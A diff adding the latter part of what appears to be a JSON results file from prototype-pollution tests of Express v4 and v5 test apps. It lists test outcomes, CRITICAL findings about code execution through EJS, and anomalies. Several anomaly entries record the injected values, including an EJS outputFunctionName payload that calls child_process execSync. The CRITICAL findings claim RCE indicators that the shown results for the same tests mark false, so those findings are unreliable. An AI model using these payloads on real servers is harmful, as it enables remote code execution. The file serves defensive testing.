+        "trigger_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "rce_indicators": false
+      }
+    },
+    {
+      "id": 117,
+      "test": "rce_ejs_client_true",
+      "version": "v4",
+      "data": {
+        "pollution_status": 500,
+        "polluted_keys": {},
+        "trigger_status": 500,
+        "trigger_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "rce_indicators": false
+      }
+    },
+    {
+      "id": 118,
+      "test": "rce_ejs_debug",
+      "version": "v4",
+      "data": {
+        "pollution_status": 500,
+        "polluted_keys": {},
+        "trigger_status": 500,
+        "trigger_response": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>TypeError: res.status is not a function<br> &nbsp; &nbsp;at /home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/app.js:421:7<br> &nbsp; &nbsp;at Layer.handle_error (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/layer.js:71:5)<br> &nbsp; &nbsp;at trim_prefix (/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/testapp-v4/node_modules/express/lib/router/index.js:326:13)<br> &nbsp; &nbsp;at",
+        "rce_indicators": false
+      }
+    },
+    {
+      "id": 119,
+      "test": "compare_qs_proto_basic",
+      "version": "v5",
+      "data": {
+        "polluted": false,
+        "keys": {},
+        "status": 200
+      }
+    },
+    {
+      "id": 120,
+      "test": "compare_qs_proto_basic",
+      "version": "v4",
+      "data": {
+        "polluted": false,
+        "keys": {},
+        "status": 500
+      }
+    },
+    {
+      "id": 121,
+      "test": "compare_qs_constructor",
+      "version": "v5",
+      "data": {
+        "polluted": false,
+        "keys": {},
+        "status": 200
+      }
+    },
+    {
+      "id": 122,
+      "test": "compare_qs_constructor",
+      "version": "v4",
+      "data": {
+        "polluted": false,
+        "keys": {},
+        "status": 500
+      }
+    },
+    {
+      "id": 123,
+      "test": "compare_json_proto_basic",
+      "version": "v5",
+      "data": {
+        "polluted": true,
+        "keys": {
+          "polluted": "compare"
+        },
+        "status": 200
+      }
+    },
+    {
+      "id": 124,
+      "test": "compare_json_proto_basic",
+      "version": "v4",
+      "data": {
+        "polluted": false,
+        "keys": {},
+        "status": 500
+      }
+    },
+    {
+      "id": 125,
+      "test": "compare_json_constructor",
+      "version": "v5",
+      "data": {
+        "polluted": true,
+        "keys": {
+          "polluted": "compare"
+        },
+        "status": 200
+      }
+    },
+    {
+      "id": 126,
+      "test": "compare_json_constructor",
+      "version": "v4",
+      "data": {
+        "polluted": false,
+        "keys": {},
+        "status": 500
+      }
+    }
+  ],
+  "findings": [
+    {
+      "id": 1,
+      "title": "Prototype Pollution \u2192 RCE via EJS (ejs_outputFunctionName_rce)",
+      "severity": "CRITICAL",
+      "cwe": "CWE-1321 / CWE-94",
+      "description": "Pollute outputFunctionName \u2192 trigger EJS render \u2192 code execution. Response contained RCE indicators.",
+      "framework_behavior": true,
+      "note": "EJS template engine executes polluted prototype properties during render",
+      "version": "v4"
+    },
+    {
+      "id": 2,
+      "title": "Prototype Pollution \u2192 RCE via EJS (ejs_client_true)",
+      "severity": "CRITICAL",
+      "cwe": "CWE-1321 / CWE-94",
+      "description": "Pollute client=true to change EJS compilation behavior. Response contained RCE indicators.",
+      "framework_behavior": true,
+      "note": "EJS template engine executes polluted prototype properties during render",
+      "version": "v4"
+    },
+    {
+      "id": 3,
+      "title": "Prototype Pollution \u2192 RCE via EJS (ejs_debug)",
+      "severity": "CRITICAL",
+      "cwe": "CWE-1321 / CWE-94",
+      "description": "Pollute debug/compileDebug to expose template source. Response contained RCE indicators.",
+      "framework_behavior": true,
+      "note": "EJS template engine executes polluted prototype properties during render",
+      "version": "v4"
+    },
+    {
+      "id": 4,
+      "title": "v4/v5 Difference: json_proto_basic \u2014 v4=False, v5=True",
+      "severity": "MEDIUM",
+      "cwe": "CWE-1321",
+      "description": "Prototype pollution behavior differs: v4 polluted=False, v5 polluted=True",
+      "framework_behavior": true,
+      "version": "comparison"
+    },
+    {
+      "id": 5,
+      "title": "v4/v5 Difference: json_constructor \u2014 v4=False, v5=True",
+      "severity": "MEDIUM",
+      "cwe": "CWE-1321",
+      "description": "Prototype pollution behavior differs: v4 polluted=False, v5 polluted=True",
+      "framework_behavior": true,
+      "version": "comparison"
+    }
+  ],
+  "anomalies": [
+    {
+      "id": 1,
+      "test": "proto_direct",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v5"
+    },
+    {
+      "id": 2,
+      "test": "proto_admin",
+      "desc": "deepMerge pollution only (app-level): {\"admin\": true}",
+      "version": "v5"
+    },
+    {
+      "id": 3,
+      "test": "proto_multiple",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": true, \"admin\": true, \"role\": \"admin\"}",
+      "version": "v5"
+    },
+    {
+      "id": 4,
+      "test": "constructor_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v5"
+    },
+    {
+      "id": 5,
+      "test": "constructor_deep",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v5"
+    },
+    {
+      "id": 6,
+      "test": "nested_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v5"
+    },
+    {
+      "id": 7,
+      "test": "deep_nested_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v5"
+    },
+    {
+      "id": 8,
+      "test": "array_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v5"
+    },
+    {
+      "id": 9,
+      "test": "ejs_outputFn",
+      "desc": "deepMerge pollution only (app-level): {\"outputFunctionName\": \"x;process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")//\"}",
+      "version": "v5"
+    },
+    {
+      "id": 10,
+      "test": "proto_shell",
+      "desc": "deepMerge pollution only (app-level): {\"shell\": \"/bin/sh\"}",
+      "version": "v5"
+    },
+    {
+      "id": 11,
+      "test": "proto_env",
+      "desc": "deepMerge pollution only (app-level): {\"env\": {\"EVIL\": \"true\"}}",
+      "version": "v5"
+    },
+    {
+      "id": 12,
+      "test": "proto_number",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": 1}",
+      "version": "v5"
+    },
+    {
+      "id": 13,
+      "test": "proto_bool",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": true}",
+      "version": "v5"
+    },
+    {
+      "id": 14,
+      "test": "proto_object",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": {\"nested\": true}}",
+      "version": "v5"
+    },
+    {
+      "id": 15,
+      "test": "proto_direct",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v4"
+    },
+    {
+      "id": 16,
+      "test": "proto_admin",
+      "desc": "deepMerge pollution only (app-level): {\"admin\": true}",
+      "version": "v4"
+    },
+    {
+      "id": 17,
+      "test": "proto_multiple",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": true, \"admin\": true, \"role\": \"admin\"}",
+      "version": "v4"
+    },
+    {
+      "id": 18,
+      "test": "constructor_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v4"
+    },
+    {
+      "id": 19,
+      "test": "constructor_deep",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v4"
+    },
+    {
+      "id": 20,
+      "test": "nested_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v4"
+    },
+    {
+      "id": 21,
+      "test": "deep_nested_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v4"
+    },
+    {
+      "id": 22,
+      "test": "array_proto",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": \"true\"}",
+      "version": "v4"
+    },
+    {
+      "id": 23,
+      "test": "ejs_outputFn",
+      "desc": "deepMerge pollution only (app-level): {\"outputFunctionName\": \"x;process.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\")//\"}",
+      "version": "v4"
+    },
+    {
+      "id": 24,
+      "test": "proto_shell",
+      "desc": "deepMerge pollution only (app-level): {\"shell\": \"/bin/sh\"}",
+      "version": "v4"
+    },
+    {
+      "id": 25,
+      "test": "proto_env",
+      "desc": "deepMerge pollution only (app-level): {\"env\": {\"EVIL\": \"true\"}}",
+      "version": "v4"
+    },
+    {
+      "id": 26,
+      "test": "proto_number",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": 1}",
+      "version": "v4"
+    },
+    {
+      "id": 27,
+      "test": "proto_bool",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": true}",
+      "version": "v4"
+    },
+    {
+      "id": 28,
+      "test": "proto_object",
+      "desc": "deepMerge pollution only (app-level): {\"polluted\": {\"nested\": true}}",
+      "version": "v4"
+    },
+    {
+      "id": 29,
+      "test": "depth_1",
+      "desc": "Deep merge pollution: {\"polluted\": \"depth1\"}",
+      "version": "v5"
+    },
+    {
+      "id": 30,
+      "test": "depth_2",
+      "desc": "Deep merge pollution: {\"polluted\": \"depth2\"}",
+      "version": "v5"
+    },
+    {
+      "id": 31,
+      "test": "depth_3",
+      "desc": "Deep merge pollution: {\"polluted\": \"depth3\"}",
+      "version": "v5"
+    },
+    {
+      "id": 32,
+      "test": "constructor_1",
+      "desc": "Deep merge pollution: {\"polluted\": \"constructor1\"}",
+      "version": "v5"
+    },
+    {
+      "id": 33,
+      "test": "mixed",
+      "desc": "Deep merge pollution: {\"polluted\": \"mixed\"}",
+      "version": "v5"
+    },
+    {
+      "id": 34,
+      "test": "hidden_in_large",
+      "desc": "Deep merge pollution: {\"polluted\": \"hidden\"}",
+      "version": "v5"
+    },
+    {
+      "id": 35,
+      "test": "depth_1",
+      "desc": "Deep merge pollution: {\"polluted\": \"depth1\"}",
+      "version": "v4"
+    },
+    {
+      "id": 36,
+      "test": "depth_2",
+      "desc": "Deep merge pollution: {\"polluted\": \"depth2\"}",
+      "version": "v4"
+    },
+    {
+      "id": 37,
+      "test": "depth_3",
+      "desc": "Deep merge pollution: {\"polluted\": \"depth3\"}",
+      "version": "v4"
+    },
+    {
+      "id": 38,
+      "test": "constructor_1",
+      "desc": "Deep merge pollution: {\"polluted\": \"constructor1\"}",
+      "version": "v4"
+    },
+    {
+      "id": 39,
+      "test": "mixed",
+      "desc": "Deep merge pollution: {\"polluted\": \"mixed\"}",
+      "version": "v4"
+    },
+    {
+      "id": 40,
+      "test": "hidden_in_large",
+      "desc": "Deep merge pollution: {\"polluted\": \"hidden\"}",
+      "version": "v4"
+    },
+    {
+      "id": 41,
+      "test": "ejs_outputFunctionName_rce",
+      "desc": "Pollution successful but no RCE: polluted={\"outputFunctionName\": \"x;return global.process.mainModule.constructor._resolveFilename(\\\"os\\\")//\"}, trigger_status=200",
+      "version": "v5"
+    }
+  ],
+  "summary": {
+    "total_tests": 126,
+    "findings_count": 5,
+    "anomalies_count": 41,
+    "findings_by_severity": {
+      "CRITICAL": 3,
+      "MEDIUM": 2
+    }
+  }
+}
